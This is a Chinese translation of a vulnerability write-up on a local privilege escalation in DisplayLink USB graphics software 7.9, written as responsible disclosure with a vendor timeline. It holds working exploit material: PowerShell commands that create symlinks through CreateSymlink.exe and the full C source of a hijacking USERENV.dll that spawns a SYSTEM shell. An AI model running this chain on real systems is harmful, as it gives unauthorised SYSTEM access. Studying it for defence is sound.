> 原文链接: https://www.anquanke.com//post/id/209710 


# DisplayLink USB显卡软件任意文件写入导致本地权限提升漏洞分析


                                阅读量   
                                **143637**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者almond，文章来源：offsec.almond.consulting
                                <br>原文地址：[https://offsec.almond.consulting/displaylink-usb-graphics-arbitrary-file-write-eop.html](https://offsec.almond.consulting/displaylink-usb-graphics-arbitrary-file-write-eop.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t012fcd5db4df4cf7cf.png)](https://p0.ssl.qhimg.com/t012fcd5db4df4cf7cf.png)



## 一、概述

在DisplayLink USB显卡软件7.9.296.0版本中，我们发现了一个本地特权提升漏洞，该漏洞是由于对日志文件夹的访问权限过大，导致可以滥用DisplayLink USB显卡软件执行特权文件操作，例如创建任意文件。这一漏洞可以被攻击者利用，例如通过对特权DisplayLink进程进行DLL劫持，以获得本地计算机上的SYSTEM特权。

该漏洞已经在最新版本中实现修复，因此建议用户应更新到最新版本。

此外，根据DisplayLink官方说明，7.9版本与Windows 10存在不兼容现象，可能会导致出现稳定性问题。



## 二、漏洞概述

在使用Windows笔记本进行配置审查时，我通常会使用Clément Labro（[@itm4n](https://github.com/itm4n)）的PrivescCheck工具检查其中是否存在普通的权限提升技术。

在PrivescCheck中，列出了一些可修改的路径，其中包括`C:Program FilesDisplayLink Core SoftwareDebug`这一路径。该路径允许Everybody进行写入、删除、写入属性、调试等权限。因此，对于所有用户来说，似乎对于`C:Program FilesDisplayLink Core SoftwareDebug`文件夹都具有非常大的权限。

那么，这个程序到底是什么呢？我们可以查看`services.msc`，以获得更多信息：<br>[![](https://p0.ssl.qhimg.com/t010e8fd5f8a1d0875c.png)](https://p0.ssl.qhimg.com/t010e8fd5f8a1d0875c.png)<br>
最终我们得知，这个服务是显卡软件的一部分，可以自动运行，并且会以SYSTEM权限运行。

如果DisplayLink软件利用这个Debug文件夹中的文件执行特权操作，那么这将可能会成为一个本地权限提升的漏洞利用路径。<br>
在我同事Clément Lavoillotte的帮助下，我成功发现并利用了这个漏洞，感谢他提供的关于Windows特权文件操作滥用的介绍文章。



## 三、漏洞利用探索过程

我使用Windows 10 1909虚拟机环境进行测试，在上面安装了相同版本的DisplayLink。

在进行配置审查时，那台Windows笔记本电脑上面使用的是DisplayLink 7.9.296.0版本。这是一个旧版本，目前已经不在官网下载页面上列出了。

通过查找页面历史镜像，可以找到这个旧版本的下载链接。

### <a class="reference-link" name="3.1%20%E8%BF%87%E5%BA%A6%E7%9A%84%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"></a>3.1 过度的访问权限

在安装软件之后，我们来查看一下Debug文件夹的权限：

[![](https://p0.ssl.qhimg.com/t01be66ab864a7681f3.png)](https://p0.ssl.qhimg.com/t01be66ab864a7681f3.png)

值得关注的是，`Everybody`对这个文件夹具有完全控制权。

如果在这个文件夹中包含了敏感文件（例如：DLL文件），我们便可以对其进行修改，从而将恶意代码以SYSTEM身份运行。接下来，我们来查看这个文件夹中的内容：

[![](https://p2.ssl.qhimg.com/t01e63d28f87c452852.png)](https://p2.ssl.qhimg.com/t01e63d28f87c452852.png)

其中只有日志文件，因此，没有直接的方法来实现特权提升。但是，我们观察到其中包含`.log`和`.old.log`文件，这表明日志可能会进行轮换。而正如Clément在他的文章中所解释的那样，我们可以利用日志轮换来实现任意文件创建。

### <a class="reference-link" name="3.2%20%E6%97%A5%E5%BF%97%E8%BD%AE%E6%8D%A2"></a>3.2 日志轮换

我们使用Procmon来观察日志轮换：

[![](https://p2.ssl.qhimg.com/t018f72fc89bb4ef48e.png)](https://p2.ssl.qhimg.com/t018f72fc89bb4ef48e.png)

在启动时，`DisplayLinkManager.exe`似乎会进行以下操作：

1、打开`DisplayLinkManager.log`日志文件；<br>
2、检查该日志文件（可能是日志内容，或者文件大小）是否满足条件；<br>
3、如果符合条件，则进行日志轮换：

（1）删除`DisplayLinkManager.old.log`文件（如果存在）；<br>
（2）将`DisplayLinkManager.log`重命名为`DisplayLinkManager.old.log`；<br>
（3）创建一个新的`DisplayLinkManager.log`。

如我们所见，上述操作都是以SYSTEM用户身份执行的。我们查看了事件的详细信息，确认在这里并不是模拟用户进行的操作。

由于DisplayLink Manager在访问这些文件时并没有模拟用户，因此我们就可以利用这一点，实现任意文件的写入或删除。

### <a class="reference-link" name="3.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA"></a>3.3 任意文件创建

接下来，我们尝试欺骗DisplayLink Manager，将我们控制的文件移动到特权位置。我们可以使用Google Project Zero开发的SymbolicLink测试工具中的`CreateSymlink.exe`来实现这一目标。

可以按照如下方式创建符号链接：

1、从`C:Program FilesDisplayLink Core SoftwareDebugDisplayLinkManager.log`到我们要移动的文件；

2、从`C:Program FilesDisplayLink Core SoftwareDebugDisplayLinkManager.old.log`到我们要放置文件的位置。

但是，为了成功创建，Debug文件夹必须为空，因为`CreateSymlink.exe`程序会将其替换为`RPC Control`的挂载点。如果我们尝试删除Debug文件夹中存在的日志文件，会产生以下错误：

[![](https://p4.ssl.qhimg.com/t01b98ad18bc6e5dc17.png)](https://p4.ssl.qhimg.com/t01b98ad18bc6e5dc17.png)

尽管我们可以完全控制文件夹及内容，但是由于日志文件是由DisplayLink Manager进程打开的，因此无法删除这些内容。并且，我们无法停止DisplayLink Manager进程，因为它们是以SYSTEM身份运行，而我们仅仅是普通用户的权限。

那么，应该如何绕过呢？由于我们可以完全控制Debug文件夹，因此也可以对其ACL进行修改。例如，我们可以将其修改为SYSTEM对该文件夹及内容没有修改权限：

[![](https://p0.ssl.qhimg.com/t01445647a2da776955.png)](https://p0.ssl.qhimg.com/t01445647a2da776955.png)

现在，在重启计算机后，DisplayLink Manager将无法在该文件夹中打开日志文件，随即我们就可以将其删除。我们还可以删除`DisplayLinkUserAgent.log`。该文件由DisplayLink用户代理应用程序打开，而这个应用程序也是以SYSTEM身份运行。

由于DisplayLink UI Systray应用程序打开了`DisplayLinkUI.log`和`DisplayLinkUIAddOnApi.log`，该应用程序以当前用户的权限运行，因此我们可以在任务管理器中将其关闭，然后删除日志文件。

[![](https://p1.ssl.qhimg.com/t0195be6073da95a4dc.png)](https://p1.ssl.qhimg.com/t0195be6073da95a4dc.png)

之后，我们将获得一个干净的并且完全为空的Debug文件夹：

[![](https://p1.ssl.qhimg.com/t010e45cce5f05230ad.png)](https://p1.ssl.qhimg.com/t010e45cce5f05230ad.png)

现在，我们就可以尝试漏洞利用过程。我们尝试将我们控制的文件移动到`C:WindowsSystem32`。通过观察日志文件的大小，我们注意到，当日志文件超过101KB时将会发生日志轮换，因此我们需要确保自定义文件超过这个大小。

```
PS C:Temp&gt; ls

    Directory: C:Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/24/2020   6:58 PM         192302 arbitrary_file.txt


PS C:Temp&gt; Get-Content -TotalCount 8 .arbitrary_file.txt
"Disposable Heroes"

Bodies fill the fields I see, hungry heroes end
No one to play soldier now, no one to pretend
Running blind through killing fields, bred to kill them all
Victim of what said should be
A servant 'til I fall

PS C:Temp&gt; Get-FileHash -Algorithm SHA256 -Path .arbitrary_file.txt

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          B3C1196F2E9A45C71C31BC2B73A216025793A31FED1B0FBE6FD14106FC637C1D       C:Temparbitrary_file.txt

```

创建符号链接：

```
PS C:SymlinkTestTools&gt; .CreateSymlink.exe -p "C:Program FilesDisplayLink Core SoftwareDebugDisplayLinkManager.log" "C:Temparbitrary_file.txt"
PS C:SymlinkTestTools&gt; .CreateSymlink.exe -p "C:Program FilesDisplayLink Core SoftwareDebugDisplayLinkManager.old.log" "C:WindowsSystem32target_arbitrary_file.dll"
```

我们的目标文件扩展名为.dll，这是为了证明我们完全可以控制名称。

注意：在创建符号链接时，需确保当前没有其他进程正在访问Debug文件夹。其中包括打开文件夹的explorer.exe窗口，或者带有指向该文件夹的快速访问标签。如果存在上述情况，可能会出现问题。

我们查看在`RPC Control`中创建的对象，可以看到我们的“日志文件”。为此，我们使用Sysinternals Suite中的`WinObj.exe`。

[![](https://p1.ssl.qhimg.com/t01b847037f66647916.png)](https://p1.ssl.qhimg.com/t01b847037f66647916.png)

现在，我们可以注销帐户并重新登录，然后：

[![](https://p1.ssl.qhimg.com/t01b3272ff4fcafe2a8.png)](https://p1.ssl.qhimg.com/t01b3272ff4fcafe2a8.png)

```
PS C:&gt; Get-FileHash -Algorithm SHA256 -Path "C:WindowsSystem32target_arbitary_file.dll"

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          B3C1196F2E9A45C71C31BC2B73A216025793A31FED1B0FBE6FD14106FC637C1D       C:WindowsSystem32target_ar...
```

至此，就实现了任意文件写入！我们在Procmon中查看相应条目，其中体现了将我们的任意文件移动到system32文件夹的日志轮换。

[![](https://p3.ssl.qhimg.com/t01422f687e5271b072.png)](https://p3.ssl.qhimg.com/t01422f687e5271b072.png)

### <a class="reference-link" name="3.4%20%E5%AF%BB%E6%89%BE%E4%B8%A2%E5%A4%B1%E7%9A%84DLL"></a>3.4 寻找丢失的DLL

那么，我们如何利用这个任意文件漏洞，来提升我们的权限呢？我们想到的第一个思路是尝试将`sethc.exe`替换为`cmd.exe`，以使用粘滞键弹出Shell。

但是，SYSTEM系统进程没有权限修改这些文件，只有`TrustedInstaller`具有这样的权限。当然，在具有特权的情况下，有一些技术可以实现这一目标，但是我们目前还没有成功提升权限，因此也无法利用这样的方法。

所以，我们选择了另外一个思路。我们看到DisplayLink Manager尝试加载但失败的DLL，加载失败的原因在于它们没有位于加载器首先尝试加载它们的位置（根据标准DLL加载顺序）。因此，我们现在的思路是，使用自定义的DLL来替换这些丢失的DLL，可以使用简单的DLL劫持，以SYSTEM的身份执行任意代码。

因此，我们启动ProcMon，搜索DisplayLink Manager未成功加载的DLL：

[![](https://p5.ssl.qhimg.com/t011281b22604f45381.png)](https://p5.ssl.qhimg.com/t011281b22604f45381.png)

我们可以看到，DisplayLink Manager尝试加载文件夹中似乎缺失的几个DLL，例如：`VERSION.dll`、`USERENV.dll`和`dbghelp.dll`，这些也是在DLL劫持中的常见怀疑对象。

现在，如果我们成功地创建了一个文件，例如`C:Program FilesDisplayLink Core SoftwareUSERENV.dll`，那么就可以以SYSTEM身份执行代码。上述之中的任何一个DLL都可以作为目标，而我通常会选择其中的`USERENV.dll`。

为了创建恶意DLL，我们首先来看看Display Manager从`USERENV.dll`导入的函数。为此，我将使用CFF Explorer。

[![](https://p0.ssl.qhimg.com/t011a22168d3a0b8452.png)](https://p0.ssl.qhimg.com/t011a22168d3a0b8452.png)

通过查看，我们发现从`USERENV.dll`导入了几个函数，例如`wit`、`DestroyEnvironmentBlock`、`LoadUserProfileW`、`UnloadUserProfile`、`LoadUserProfileA`和`CreateEnvironmentBlock`。

随后，我们可以创建一个导出这些函数的DLL，但实际上会调用我们想要执行的命令。受到DLL劫持这篇文章的启发，我的代码实现如下：

```
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
`{`
    switch (ul_reason_for_call)
    `{`
    case DLL_PROCESS_ATTACH:
        WinExec("cmd.exe", SW_NORMAL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    `}`
    return TRUE;
`}`

extern "C" __declspec(dllexport) void DestroyEnvironmentBlock()
`{`
    WinExec("cmd.exe", SW_NORMAL);
`}`

extern "C" __declspec(dllexport) void LoadUserProfileW()
`{`
    WinExec("cmd.exe", SW_NORMAL);
`}`

extern "C" __declspec(dllexport) void UnloadUserProfile()
`{`
    WinExec("cmd.exe", SW_NORMAL);
`}`

extern "C" __declspec(dllexport) void LoadUserProfileA()
`{`
    WinExec("cmd.exe", SW_NORMAL);
`}`

extern "C" __declspec(dllexport) void CreateEnvironmentBlock()
`{`
    WinExec("cmd.exe", SW_NORMAL);
`}`
```

在这里，我只是调用进程使用的每个函数，并使其执行`cmd.exe`。接下来，我们对其进行编译和植入。

注意：在进行劫持时，需要静态编译DLL。

我们的DLL需要超过101KB时才能触发日志轮换，因此，如果文件太小，我们可以使用空字节对其进行填充。



## 四、完整漏洞利用链

接下来，可以将上面的所有内容串联起来了：

1、修改`C:Program FilesDisplayLink Core SoftwareDebug`的ACL，禁用SYSTEM的修改权限；

2、重新启动系统；

3、终止`DisplayLinkUI.exe`进程；

4、清空`C:Program FilesDisplayLink Core SoftwareDebug`文件夹；

5、使用`CreateSymlink.exe`，创建从`C:Program FilesDisplayLink Core SoftwareDebugDisplayLinkManager.log`到恶意DLL的符号链接；

6、使用`CreateSymlink.exe`，创建从`C:Program FilesDisplayLink Core SoftwareDebugDisplayLinkManager.old.log`到`C:Program FilesDisplayLink Core SoftwareUSERENV.dll`的符号链接；

7、注销用户会话，然后重新登录。

8、成功实现漏洞利用。[![](https://p2.ssl.qhimg.com/t017caf89e54ff345e9.png)](https://p2.ssl.qhimg.com/t017caf89e54ff345e9.png)

至此，我们就获得了SYSTEM Shell。在这里，我们可以看到实际弹出了两个cmd.exe Shell，这是因为我们的恶意DLL是由DisplayLink Manager（以SYSTEM运行）和DisplayLink UI Systray（以当前用户运行）加载的。因此，我们的Payload会执行两次。

其次，我们很幸运能在桌面上弹出一个Shell。这是因为DisplayLink Manager在我们的会话中启动一个进程，然后加载DLL。因此，命令行就可以在我们的图形化Windows会话中弹出。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f0b7fb74789fab16.png)

如果它在session 0中运行，cmd.exe就不会出现在我们的桌面上，当然，在这种情况下我们的Payload仍然可以执行，但我们可能需要更复杂的Payload才能在用户会话中创建进程。



## 五、总结

通过这一漏洞的利用，我们在客户端的计算机上找到了本地权限提升的路径，而这一漏洞利用不会受到任何配置的干扰。

在后续版本中，Debug文件夹已经不再存在，开发者通过调整安装文件夹中的结构来规避了存在问题的ACL。



## 六、时间节点

2020年4月23日 通知厂商软件的7.9版本中存在漏洞，但7.9以后的版本似乎没有受到影响。<br>
2020年4月23日 收到厂商回复，表示7.9版本与Windows 10不兼容，并且存在潜在的不稳定性，建议避免在Windows 10上使用该软件。<br>
2020年4月28日 收到GPG密钥，用于将加密后的安全建议发送至DisplayLink安全团队。<br>
2020年4月29日 向DisplayLink安全团队发送安全建议。<br>
2020年4月30日 DisplayLink安全团队确认收到安全建议。<br>
2020年5月15日 DisplayLink确认7.9以上版本不受影响。<br>
2020年7月1日 发布文章。
